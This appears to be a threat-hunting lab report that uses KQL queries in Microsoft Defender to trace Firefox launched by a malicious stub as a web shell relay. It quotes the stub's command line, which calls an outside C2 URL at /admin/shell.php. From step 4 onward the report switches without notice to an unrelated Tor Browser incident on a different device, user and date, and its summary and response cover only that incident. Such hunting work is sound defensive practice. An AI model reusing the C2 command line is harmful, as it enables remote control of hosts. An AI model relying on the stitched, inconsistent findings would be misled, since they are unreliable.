<img width="400" src="https://github.com/user-attachments/assets/06701f92-d410-4a48-b8b5-eba364812972" />

# Threat Hunt Report – Firefox Used as a Web Shell Relay
- [Scenario Creation](https://github.com/antoniofranc/Threat-Hunt-Scenario-Firefox-as-a-Web-Shell-Relay-/blob/main/threat-hunting-scenario-firefox-as-a-web-shell-relay.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Mozilla Firefox (installed via malicious stub)

##  Scenario

Security monitoring flagged suspicious behavior on workstation `snet` associated with user `employee0`.
At first glance, the endpoint showed a deleted Firefox executable, but further telemetry revealed a malicious installation and usage of Firefox as a `web shell relay`.

The installation was initiated through a malicious stub file that attempted to launch Firefox with a temporary malicious profile and connect to an external command-and-control (C2) URL hosted on `172.203.80.23`/admin/shell.php.

This behavior strongly indicates unauthorized browser installation and potential remote access activity through web shell relay techniques.


### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for creation or deletion of `firefox.exe` or related stub installers.
- **Check `DeviceProcessEvents`** for suspicious Firefox process launches with command-line flags.
- **Check `DeviceNetworkEvents`** for outbound HTTP requests to unauthorized IPs or domains.

---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

Initial query revealed that employee0 executed a Firefox installer from their Downloads directory, which created temporary folders named Temp and MalProfile, later deleted.
Evidence revealed a deleted executable:
`C:\Program Files\Mozilla Firefox\firefox.exe`
The deletion occurred at `2025-10-12 01:55:24 AM`, immediately after execution by user employee0.

The initiating process was a suspicious stub: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "snet"
| where InitiatingProcessAccountName == "employee0"
| where FileName contains "firefox.exe"
| where FolderPath contains "Mozilla Firefox"
| where Timestamp >=  datetime(2025-10-12T04:29:57.4331627Z)
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine


```
<img src="https://github.com/user-attachments/assets/0994355f-14ed-43a7-8f58-72f54ac9c8d2" />



---

### 2. Searched the `DeviceProcessEvents` Table Firefox Launch Parameters

I searched the DeviceProcessEvents table for any ProcessCommandLine containing the string `setup-stub.exe`. Based on the returned logs, The stub executed Firefox in non-interactive (no-remote) mode with a temporary malicious profile named `MalProfile`.
The command also contained a direct HTTP reference to `/admin/shell.php`, indicating a potential reverse shell or web shell callback. 
Further investigation revealed setup-stub.exe launching Firefox with malicious arguments, linking directly to remote payloads.

**Query used to locate event:**

```kql
DeviceProcessEvents
| where DeviceName == "snet"
| where ProcessCommandLine contains "setup-stub.exe" 
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
```
<img width="1680" height="293" alt="image" src="https://github.com/user-attachments/assets/a9cb616c-62e2-41d8-ab77-9ed6de0da1af" />


---

### 3. Searched the `DeviceProcessEvents` Table for Setup and Command Execution

I searched the DeviceProcessEvents table for any indication that user "employee0" executed malicious arguments. Evidence confirmed that Detected three executions of download.exe from random temporary directories — strong indicators of malware dropper activity. Each process used /LaunchedFromStub and executed within seconds.


**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "snet"
| where ProcessCommandLine contains "download.exe"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
```
<img width="1883" height="224" alt="image" src="https://github.com/user-attachments/assets/10195357-95fe-4df4-8a1d-23714e7db048" />


---

### 4. Searched the `DeviceNetworkEvents` Table for TOR Network Connections

I searched the DeviceNetworkEvents table for any indication that Tor Browser was used to establish connections on known Tor ports. At October 5, 2025, 01:19:28 UTC (2025-10-05T01:19:28.9493569Z), approximately two minutes after the silent Tor Browser installation, user "walnet" successfully established an outbound connection to a Tor relay node at IP address 80.67.167.86 on port 9001, indicating active engagement with the Tor anonymization network. Multiple additional connections to Tor infrastructure were also observed during this timeframe. There were a couple other connections to sites over port 443.

**Query used to locate events:**

```kql
DeviceNetworkEvents  
| where DeviceName == "walnet"  
| where InitiatingProcessAccountName != "system"  
| where InitiatingProcessFileName in ("tor.exe", "firefox.exe")  
| where RemotePort in ("9001", "9030", "9040", "9050", "9051", "9150", "80", "443")  
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessFolderPath  
| order by Timestamp desc
```
<img width="1419" height="555" alt="image" src="https://github.com/user-attachments/assets/510fec6c-0ad7-4d91-95cb-470169b24950" />


---

## Chronological Event Timeline 

### 1. Process Execution - TOR Browser Installation

- **Timestamp:** `2025-10-05T01:18:04.9518825Z`
- **Event:** The user "walnet" executed the file `tor-browser-windows-x86_64-portable-14.5.7.exe` in silent mode, initiating a background installation of the Tor Browser.
- **Action:** Process creation detected.
- **Command:** `tor-browser-windows-x86_64-portable-14.5.7.exe /S`
- **File Path:** `C:\Users\walnet\Downloads\tor-browser-windows-x86_64-portable-14.5.7.exe`

### 2. System Activity - TOR Installation Files Created

- **Timestamp:** `2025-10-05T01:18:05Z – 2025-10-05T01:19:15Z`
- **Event:** The system created multiple Tor-related files and directories under the user’s profile folder following the silent installation.
- **Action:** Process creation detected.
- **Source:** DeviceProcessEvents


### 3. Process Execution - TOR Browser Launch

- **Timestamp:** `2025-10-05T01:19:20.8474222Z`
- **Event:** User "walnet" launched the Tor Browser `firefox.exe`. A child process `tor.exe` was also initiated, confirming that the browser started successfully.
- **Action:** Process creation of TOR browser-related executables detected.
- **File Path:** `C:\Users\walnet\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`

### 4. Network Connection - TOR Network Established

- **Timestamp:** `2025-10-05T01:19:28.9493569Z`
- **Event:** An outbound connection was made from `tor.exe` to a known Tor relay node IP `80.67.167.86` on port `9001`, confirming successful connection to the Tor anonymization network.
- **Action:** Connection success.
- **Process:** `tor.exe`
- **File Path:** `c:\users\walnet\desktop\tor browser\browser\torbrowser\tor\tor.exe`



---

## Summary

On October 5, 2025, user walnet on device walnet silently installed the Tor Browser (v14.5.7) at 01:18 UTC using the /S flag. Within a minute, `firefox.exe` and  `tor.exe` processes were launched, confirming active Tor usage. At 01:19:28 UTC, the device connected to a Tor relay node (80.67.167.86:9001) and other Tor/HTTPS endpoints, indicating anonymized browsing or data exchange. About 12 minutes later, a file named `tor-shopping-list.txt` appeared on the desktop. No authorized business reason was identified for Tor activity, indicating a potential policy violation and security risk.


---

## Response Taken

TOR usage was confirmed on the endpoint `walnet` by the user `walnet`. The device was isolated, and the user's direct manager was notified.

---
